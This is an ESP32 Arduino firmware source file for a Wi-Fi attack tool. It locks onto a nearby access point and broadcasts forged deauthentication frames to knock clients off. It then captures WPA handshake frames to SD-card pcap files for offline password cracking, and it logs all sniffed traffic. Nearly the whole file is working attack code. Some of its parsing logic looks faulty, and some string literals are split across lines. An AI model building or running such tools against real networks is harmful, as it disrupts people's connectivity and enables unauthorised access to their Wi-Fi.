#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "FS.h"
#include "SD_MMC.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"
#include <set>

#define LED_PIN 33

std::set<String> seenHandshakes;
File pcapFile;
bool pcapInitialized = false;
uint8_t targetBSSID[6];
bool targetSet = false;
uint8_t targetChannel = 1;
bool handshakeComplete = false;

uint32_t lastDeauthTime = 0;
#define DEAUTH_INTERVAL 5000

void sendDeauth(uint8_t* bssid, uint8_t* client) {
    uint8_t deauthPkt[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x01, 0x00
    };
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
        delay(2);
    }
}

bool isEAPOL(uint8_t* payload) {
    if (payload[0] != 0x88 || payload[1] != 0x01) return false;
    return true;
}

void initPcapHeader() {
    pcapFile = SD_MMC.open("/capture.pcap", FILE_WRITE);
    if (pcapFile) {
        uint32_t magic = 0xa1b2c3d4;
        uint16_t version_major = 2;
        uint16_t version_minor = 4;
        int32_t thiszone = 0;
        uint32_t sigfigs = 0;
        uint32_t snaplen = 65535;
        uint32_t network = 105;
        
        pcapFile.write((uint8_t*)&magic, 4);
        pcapFile.write((uint8_t*)&version_major, 2);
        pcapFile.write((uint8_t*)&version_minor, 2);
        pcapFile.write((uint8_t*)&thiszone, 4);
        pcapFile.write((uint8_t*)&sigfigs, 4);
        pcapFile.write((uint8_t*)&snaplen, 4);
        pcapFile.write((uint8_t*)&network, 4);
        pcapFile.close();
        pcapInitialized = true;
    }
}

void captureHandshake(uint8_t* payload, uint16_t len, uint8_t msgNum) {
    char pcapName[32];
    sprintf(pcapName, "/handshake_%02X%02X%02X%02X%02X%02X.pcap", 
            targetBSSID[0], targetBSSID[1], targetBSSID[2], 
            targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    
    pcapFile = SD_MMC.open(pcapName, FILE_APPEND);
    if (!pcapFile) return;
    
    uint32_t ts_sec = micros() / 1000000;
    uint32_t ts_usec = micros() % 1000000;
    uint32_t incl_len = len;
    uint32_t orig_len = len;
    
    pcapFile.write((uint8_t*)&ts_sec, 4);
    pcapFile.write((uint8_t*)&ts_usec, 4);
    pcapFile.write((uint8_t*)&incl_len, 4);
    pcapFile.write((uint8_t*)&orig_len, 4);
    pcapFile.write(payload, len);
    pcapFile.close();
    
    Serial.printf("[HANDSHAKE] Msg%d captured
", msgNum);
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (handshakeComplete) return;

    if (type == WIFI_PKT_MGMT) {
        if (payload[0] == 0x80 && !targetSet) {
            memcpy(targetBSSID, &payload[10], 6);
            targetChannel = payload[10 + 6];
            targetSet = true;
            
            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                    targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                    targetBSSID[3], targetBSSID[4], targetBSSID[5]);
            int ssid_len = payload[37];
            char ssid[33] = {0};
            if (ssid_len > 0 && ssid_len <= 32) memcpy(ssid, &payload[38], ssid_len);
            Serial.printf("[TARGET] %s | %s | CH: %d
", ssid, macStr, targetChannel);
            
            char pcapName[32];
            sprintf(pcapName, "/handshake_%02X%02X%02X%02X%02X%02X.pcap", 
                    targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                    targetBSSID[3], targetBSSID[4], targetBSSID[5]);
            pcapFile = SD_MMC.open(pcapName, FILE_WRITE);
            if (pcapFile) {
                uint32_t magic = 0xa1b2c3d4;
                uint16_t version_major = 2;
                uint16_t version_minor = 4;
                int32_t thiszone = 0;
                uint32_t sigfigs = 0;
                uint32_t snaplen = 65535;
                uint32_t network = 105;
                pcapFile.write((uint8_t*)&magic, 4);
                pcapFile.write((uint8_t*)&version_major, 2);
                pcapFile.write((uint8_t*)&version_minor, 2);
                pcapFile.write((uint8_t*)&thiszone, 4);
                pcapFile.write((uint8_t*)&sigfigs, 4);
                pcapFile.write((uint8_t*)&snaplen, 4);
                pcapFile.write((uint8_t*)&network, 4);
                pcapFile.close();
            }
            Serial.println("[*] Sending deauth to force reconnection...");
        }

        if (targetSet && payload[0] == 0xC0) {
            uint8_t* bssid = &payload[4];
            uint8_t* client = &payload[10];
            if (memcmp(bssid, targetBSSID, 6) == 0 && client[0] != 0xFF) {
                char clientStr[18];
                sprintf(clientStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                        client[0], client[1], client[2], client[3], client[4], client[5]);
                Serial.printf("[CLIENT] %s
", clientStr);
            }
        }

        if (targetSet && isEAPOL(payload)) {
            uint8_t msgNum = 0;
            uint16_t keyInfo = (payload[25] << 8) | payload[24];
            if (keyInfo & 0x0001) msgNum = 1;
            else if (keyInfo & 0x0002) msgNum = 2;
            else if (keyInfo & 0x0004) msgNum = 3;
            else if (keyInfo & 0x0008) msgNum = 4;
            
            if (msgNum > 0) {
                char key[18];
                sprintf(key, "%02X%02X%02X%02X%02X%02X-Msg%d", 
                        targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                        targetBSSID[3], targetBSSID[4], targetBSSID[5], msgNum);
                
                if (seenHandshakes.find(String(key)) == seenHandshakes.end()) {
                    seenHandshakes.insert(String(key));
                    digitalWrite(LED_PIN, LOW);
                    captureHandshake(payload, len, msgNum);
                    digitalWrite(LED_PIN, HIGH);
                    
                    if (seenHandshakes.size() >= 4) {
                        handshakeComplete = true;
                        Serial.println("[!] COMPLETE HANDSHAKE CAPTURED");
                    }
                }
            }
        }
    }

    if (pcapInitialized && len > 0 && len < 2560) {
        pcapFile = SD_MMC.open("/capture.pcap", FILE_APPEND);
        if (pcapFile) {
            uint32_t ts_sec = micros() / 1000000;
            uint32_t ts_usec = micros() % 1000000;
            uint32_t incl_len = len;
            uint32_t orig_len = len;
            pcapFile.write((uint8_t*)&ts_sec, 4);
            pcapFile.write((uint8_t*)&ts_usec, 4);
            pcapFile.write((uint8_t*)&incl_len, 4);
            pcapFile.write((uint8_t*)&orig_len, 4);
            pcapFile.write(payload, len);
            pcapFile.close();
        }
    }
}

void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); 
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);
    Serial.begin(115200);

    if (SD_MMC.begin("/sdcard", true)) {
        Serial.println("SD: OK");
        initPcapHeader();
    } else {
        Serial.println("SD: FAILED");
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    Serial.println("HANDSHAKE AUTO RUNNING");
    Serial.println("Waiting for target network...");
}

void loop() {
    uint32_t now = millis();
    
    if (targetSet && !handshakeComplete) {
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        
        if (now - lastDeauthTime > DEAUTH_INTERVAL) {
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            Serial.println("[DEAUTH] Broadcasting to force handshake...");
            sendDeauth(targetBSSID, broadcast);
            lastDeauthTime = now;
        }
    } else if (!targetSet) {
        static uint8_t ch = 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 13) + 1;
    }
    delay(100); 
}
